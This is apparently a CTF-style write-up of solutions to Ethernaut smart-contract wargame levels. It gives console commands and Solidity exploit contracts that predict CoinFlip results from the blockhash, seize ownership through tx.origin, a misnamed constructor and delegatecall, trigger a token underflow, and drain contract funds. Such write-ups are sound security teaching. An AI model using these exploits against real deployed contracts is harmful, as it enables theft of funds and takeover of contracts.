# Ethernaut - Cryptography
Solutions to https://ethernaut.zeppelin.solutions

# Fallback
await contract.owner()
await contract.getContribution()
await contract.abi
await contract.contribute({value: web3.toWei(0.0001, 'ether')}) //to satisfy require
await contract.sendTransaction({value: web3.toWei(0.001, 'ether')}); //Fallback function
await contract.withdraw() //Take all money

We call the contribute to send some funds to the function. This validates the require function and the value to the sender’s contributions array.
After we call the fallback function by sending a transaction value higher than 0. Since both conditions on require pass, then ownership of the contract is reassigned. This allows the withdraw function to transfer all the funds to the owner.

# Fallout
await contract.owner()
await contract.abi
await contract.Fal1out()
await contract.owner()

The fallout function is not a constructor due to the typo in the function name. This allows anyone to call this function and take ownership of the contract.

#CoinFlip
pragma solidity ^0.4.18;

contract CoinFlip {
    function flip(bool) public returns (bool){ }
}

contract CoinFlipExploit {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip cf = CoinFlip(0xcf9584c0e873b0d0f21a67b37f0a9300a9eea152);

  constructor() public {
  }

  function exploitFlip() public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    cf.flip(side);
       
    return true;
  }
}
We use the above CoinFlipExploit contract to pre find the side. This is done on the same blockhash on this contract and on the CoinFlip contract, so the side value is always	the same in one transaction. The blockhash value does not change until the transaction is completed. This is then done 10 times repeatedly to satisfy this.


#Telephone
pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public { }
}

contract TelephoneExploit {
  Telephone t = Telephone(0x6c8e692dc45e65b50bd454b89f6febc569fa0e8e);

  constructor() public {
  }

  function exploit() public returns (bool) {
    t.changeOwner(0xf1a55256baac0eed4781b1750e80df10c17ffa70);
    return true;
  }
}

We use the following above contract to take ownership of the Telephone contract.

# Token
await contract.transfer(0xA3e987f45492E2a12a21E45A37c012a6e5E3B01C, 30)
await contract.balanceOf(player)

The transfer function demonstrates overflow and underflow situations. Since balances is uint we hit an underflow with “balances[msg.sender] -= _value” where it modifies the value to a very large number.

# Delegation
web3.eth.sendTransaction({from:player, to:contract.address, data:web3.sha3("pwn()").slice(0,10)}, function(error, hash){});
or 
web3.sha3("pwn()").slice(0,10) and get 4 bytes and then pass the transaction data to contract address

First we need to sha3 encrypted the pwn() function. This is because we need to call the delegation function function by passing the 4 bytes of the sha3 encrypted function to take take ownership of Delegate and Delegation. The delegatecall overrides the owner storage variable with the value of the Delegate storage variable.

#Force
We have to call the selfdestruct() function to destroy the contract.